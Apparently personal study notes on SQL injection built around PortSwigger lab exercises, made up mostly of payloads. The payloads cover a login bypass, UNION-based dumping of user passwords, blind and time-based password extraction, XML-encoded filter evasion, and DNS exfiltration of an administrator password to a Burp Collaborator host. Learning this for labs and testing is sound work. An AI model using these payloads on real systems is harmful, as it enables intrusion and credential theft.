# SQL Injections
## Detection
```
'
'OR 1=1+--+
'OR 1=2+--+
time-delay payloads
triggering out-of-band network interaction
```
## Examining database
### Versions:
* Oracle DB version: `SELECT * FROM v$version`
* MySQL: `SELECT @@version`
* PostgreSQL: `SELECT version()`

DO AGAIN:
[LAB](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
[LAB](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

### Contents of DB:
* Obtaining database tables (on most of DBs except Oracle): `SELECT * FROM information_schema.tables`
* Obtaining columns: `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
* Oracle: `SELECT * FROM all_tables`, `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

NOTE: It's good idea to query Oracle table 'dual'  

*Example of workflow*
```
' UNION SELECT NULL -- 
' UNION SELECT NULL, NULL -- 
' UNION SELECT @@version, NULL --
' UNION SELECT table_name,NULL FROM information_schema.tables -- 
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table='<table_name>' -- 
' UNION SELECT username, password FROM '<table_name>' -- 
```
## SQLi in different contexts
SQLi could be placed in JSON/XML and also could be obfuscated:
```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```
We obfuscate symbols like binary or unicode  
Also we can use Hackvertor plugin for Burp (for encoding in xml use hex entities)  
If wee see that SQLi returns only one column, we can concatenate like this:
```
1 UNION SELECT username || '~' || password FROM users
```

REPEAT THIS [LAB](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

## Examples
### Retrievieng hidden data
`https://insecure-website.com/products?category=Gifts`
When user clicks on the *Gifts* category, browser requests URL from above  
SQL query:
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
Here *released* means that product is released and could be viewed by users. If we change released value to 0, we will be able to see all the products  
URL:
`https://insecure-website.com/products?category=Gifts'--`
Query:
`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`
Or we can use next query:
`https://insecure-website.com/products?category=Gifts'+OR+1=1--`
And the query will be:
`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`
1=1 returns True, so query will return all product from category *Gifts*

### Subverting application logic
If user sends login wiener and pass bluecheese, app will let him in  
Query:
`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
If we enter `administrator'--` we will get in as administrator without checking password, because query will be next:
`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

### Retrieving data from other database tables
```
SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users--
```

## UNION SQLi
### Determining the number of columns
order by method:
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```
null method:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

In Oracle we always need to specify FROM. For this purposes we have 'dual' table.  

NOTE: COMMENT COULD BE -- OR #  
To detect certain data type (e.g. string), we can place it inside of series of NULL queries:
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

### Retrieving multiple values within a single column
`' UNION SELECT username || '~' || password FROM users--` (Oracle)
Other DBs:
* Microsoft: `'foo'+'bar'`
* Postgres: `'foo'||'bar'`
* MySQL: `'foo' 'bar'` (note the space) or `CONCAT('foo','bar')`

### Blind SQL injections
* Triggered by changing logic of query (boolean results, divide-by-zero etc)
* Time delay of processing query
* Out-of-band network ineraction

#### Conditional responses
Example:  
Site uses tracking cookies with some token which is compared to tokens in DB and if it appears to be there, site returns hello message  
If we add `AND '1'='1` nothing will change because it's True statement  
But if we add `AND '1'='2` it will fail and we will detect Blind SQLi  
We can use it to brute password symbol by symbol like this:
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm        #returns True, meaning that 1 symbol of pass is greater then m
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't        #returns False, meaning that 1 symbol of pass is less then t
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's        #returns True, meaning that 1 symbol of pass is s
xyz' AND (SELECT password FROM users WHERE username='administrator') > '0'--
```
Checks before payload:
```
' AND '1'='1
' AND '1'='2
' AND (SELECT 'a' FROM users LIMIT 1)='a
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
' AND (SELECT username FROM users WHERE 'username')='administrator'--
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

Note: Control+U in Burp will url encode payload

Note: SUBSTRING() function could be named SUBSTR() on some DBs  
To check next symbol use SUBSTRING((...), 2, 1)  
it's good idea to use Burp Intruder or Python script

#### Error-based SQLi
In such case we force DB to do smth which throws an error  
For example we can force DB to try divide-by-zero:
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a          # nothing happens, because 1=2 is False and we just evaluate a to a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a          # we force DB to 1/0 because 1=1 is True
```
```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
xyz' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a') THEN TO_CHAR(1/0) ELSE 'Z' END FROM dual) = 'Z
```
In such case if 1 character of password is more then 'm', nothing happens. But if it's smaller, we force DB to 1/0, which throws an error  
For different DBs:
* Oracle: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual `
* Microsoft: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END `
* Postgres: `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`
* MySQL: `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`

Checks before payload:
```
'||(SELECT '')||'
'||(SELECT '' FROM dual)||'
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

#### Visible error-base SQLi
Sometimes DB throws some additional info in error like `Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`  
To exploit this, we can use CAST:  
`CAST((SELECT example_column FROM example_table) AS int)`
Example:
```
' AND 1=CAST((SELECT password FROM users LIMIT 1) as int) --
```
This will throw an error:  
`ERROR: invalid input syntax for type integer: "jec5qqzsfktcvtv2bewn"`  
And from ehre we get our password

```
' AND CAST((SELECT 1) AS int)--
' AND 1=CAST((SELECT 1) AS int)--
' AND 1=CAST((SELECT username FROM users) AS int)--
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

#### Time-Based SQLi
For MSSQL:
```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--     This will trigger delay       
```
Example: `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

* Oracle: ` dbms_pipe.receive_message(('a'),10)`
```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
```
* PostgreSQL: `SELECT pg_sleep(10)`
```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
' || pg_sleep(10)
'%3B SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END --           %3B stays for ;
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```
* MySQL: `SELECT SLEEP(10)`
```
SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
```
### Second-order SQLi
SQLi which is stored inside server/database and executed later with another HTTP request. Also called stored SQLi  

### OAST SQLi
We can trigger DB to perform DNS lookup  
It's possible to sue Burp collaborator for such exploits
* MSSQL: `'; exec master..xp_dirtree '//<url>/a'`
* Oracle `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`. This vuln is patched, but it's possible to exploit it on unpatched systems
* Oracle: `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`. Works on patched systems, but needs priv esc
* Postgres: `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`
* MySQL: `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')` .WOrks on Windows only
* MySQL: (maybe it's part of previous payload, idk) `SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`

We can also exfiltrate data via OAST interaction:
```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```
This will trigger request to <password><burp-collaborator-domain>
* Oracle: `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
* Microsoft: `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"') `
* PostgreSQL: 
```
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f(); 
```
* MySQL: `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` - For Windows only

## Oracle with trackingId (blind conditional sqli)
```
TrackingId=xyz'
TrackingId=xyz''
TrackingId=xyz'||(SELECT '')||'
TrackingId=xyz'||(SELECT '' FROM dual)||'
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||' 
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

More payloads [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)